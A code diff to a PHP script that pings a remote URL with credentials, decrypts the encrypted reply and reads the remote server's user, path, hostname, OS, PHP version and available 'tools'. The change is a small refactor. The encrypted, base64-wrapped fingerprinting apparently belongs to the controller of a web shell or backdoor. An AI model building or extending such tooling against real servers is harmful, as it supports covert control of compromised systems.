@@ -48,24 +48,27 @@ $info = '';
 $time = '';
 $ip = '';
 $client_ip = '';
+$tools = array();
+
 $continue = false;
+
 $result = send_request($url, array(
     'i' => base64_encode('ping')
 ), $login, $password, $proxy, $cookies);
 
 if ($result['status'] == 200) {
-    $decrypted_content = encrypt_decrypt('decrypt', $result['content'], $key, $iv);
-    $server = json_decode($decrypted_content, true);
-    $username = base64_decode($server['user']);
-    $path = base64_decode($server['path']);
-    $hostname = base64_decode($server['hostname']);
-    $php_version = base64_decode($server['php']);
-    $os = base64_decode($server['os']);
-    $info = base64_decode($server['server']);
-    $time = base64_decode($server['time']);
-    $ip = base64_decode($server['ip']);
-    $client_ip = base64_decode($server['client_ip']);
-    unset($server);
+    $response = json_decode(encrypt_decrypt('decrypt', $result['content'], $key, $iv), true);
+    $username = base64_decode($response['user']);
+    $path = base64_decode($response['path']);
+    $hostname = base64_decode($response['hostname']);
+    $php_version = base64_decode($response['php']);
+    $os = base64_decode($response['os']);
+    $info = base64_decode($response['server']);
+    $time = base64_decode($response['time']);
+    $ip = base64_decode($response['ip']);
+    $client_ip = base64_decode($response['client_ip']);
+    $tools = explode('|', base64_decode($response['tools']));
+    unset($response);
     $continue = true;
 }
 
